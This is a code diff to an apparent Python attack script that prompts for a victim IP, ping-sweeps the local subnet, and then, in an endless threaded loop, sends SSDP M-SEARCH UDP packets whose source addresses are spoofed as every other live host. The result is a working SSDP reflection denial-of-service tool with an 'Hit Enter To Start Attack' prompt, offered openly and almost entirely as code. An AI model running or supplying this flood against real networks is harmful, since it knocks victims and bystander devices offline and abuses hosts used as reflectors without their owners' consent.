@@ -3,7 +3,13 @@ import networkscan
 import psutil
 from tabulate import tabulate
 import ipaddress
-from sys import exit
+import sys
+import time
+import threading
+import itertools
+import os
+from threading import Thread
+from scapy.all import *
 
 # Defining Colour Schemas
 NONE='\033[00m'
@@ -19,6 +25,12 @@ BOLD='\033[1m'
 BLINK='\033[5m'
 UNDERLINE='\033[4m'
 
+#Check for super user
+def checksudo():
+    if os.geteuid() != 0:
+        print(f"{RED}[+] Please Run The Script As Sudo!{NONE}")
+        exit(-99)
+
 #Check Valid IP
 def checkIP(ip):
     try:
@@ -27,7 +39,7 @@ def checkIP(ip):
         return ipaddress.ip_address(ip)
     except ValueError as e :
         print(f"{RED}[+] {e}{NONE}")
-        exit(-1)
+        sys.exit(-1)
 
 #Check For Valid CIDR
 def checkCIDR(netip):
@@ -35,7 +47,7 @@ def checkCIDR(netip):
         return ipaddress.ip_network(netip,False)
     except Exception as e :
         print(f"{RED}[+] {e}{NONE}")
-        exit(-2)
+        sys.exit(-2)
 
 #Print Available interfaces
 def showlocalinterfaces():
@@ -74,7 +86,7 @@ def getuserinput():
     target=input(f"{YELLOW}[+] Enter Victim's IP : {NONE}")
     checkIP(target)
     try :
-        cidr=input(f"{BLUE}[+] Enter CIDR (Default=24) : {NONE}")
+        cidr=input(f"{BLUE}{BOLD}[+] Enter CIDR (Default=24) : {NONE}")
         if cidr=='':
             cidr=24
         else :
@@ -92,24 +104,52 @@ def checkSame(host,target,cidr):
         return (str((ipaddress.ip_network(netip,False))[0]))
     else :
         print(f"{RED}[+] Attacker And Victim Are Not In The Same Network!{NONE}")
-        exit(-3)
+        sys.exit(-3)
 
 #Perform Ping Sweep
 def pingsweep(ip,cidr):
     live=list()
-    print(f"{PURPLE}[+] Performing A PingSweep{NONE}")
+    print(f"{PURPLE}\n[+] Performing A PingSweep{NONE}")
     live=getlivehosts(f"{ip}/{cidr}")
     if len(live)==0 :
         choice=input(f"{YELLOW}[-] No Live Hosts Detected. Continue Anyway [y/N]?")
         if choice=="" or qchoice.lower()=='n' :
-            exit(-4)
+            sys.exit(-4)
         else :
             for allip in ipaddress.ip_network(f"{ip}/{cidr}"):
-                live.append(allip)
+                live.append(str(allip))
     return live
+
+#Send UDP Packet
+def sendUDPPacket(sip,dip):
+    payload = "M-SEARCH * HTTP/1.1\r\n" \
+"HOST:"+dip+":1900\r\n" \
+"ST:upnp:rootdevice\r\n" \
+"MAN: \"ssdp:discover\"\r\n" \
+"MX:2\r\n\r\n"
+    ssdppacket=(IP(src=sip,dst=dip) / UDP(sport=1900, dport= 1900) / payload)
+    send(ssdppacket,count=100 )
+
+def blasttarget(dest,sips):
+    try :
+        while True :
+            THREAD_LIST=list()
+            #sendUDPPacket(sip,dest)
+            for sip in sips :
+                if sip != dest :
+                    TEMP_THREAD=Thread(target=sendUDPPacket,args=(sip,dest))
+                    THREAD_LIST.append(TEMP_THREAD)
+            for THREAD in THREAD_LIST:
+                THREAD.start()
+            for THREAD in THREAD_LIST:
+                THREAD.join()
+    except KeyboardInterrupt :
+        print(f"{RED}[+] Exiting !{NONE}")
+        exit(0)
 
 #Main Function to call other functions
 def main():
+    checksudo()
     #Show Available interfaces
     showlocalinterfaces()
     #Get Input information
@@ -117,9 +157,13 @@ def main():
     #Check If Same Network
     nhost=(checkSame(userinput[0],userinput[1],userinput[2]))
     #Performing A Ping Sweep
-
     live=pingsweep(nhost,userinput[2])
-    print(live)
+    print(f"{CYAN}[+] Reflectors : {NONE} ")
+    for host in live :
+        print(f"{YELLOW}[+] {host}{NONE}")
+    #Sending Blast
+    input(f"\n{GREEN}[+] Hit Enter To Start Attack !{NONE}")
+    blasttarget(userinput[1],live)
 
 if __name__=='__main__':
     main()
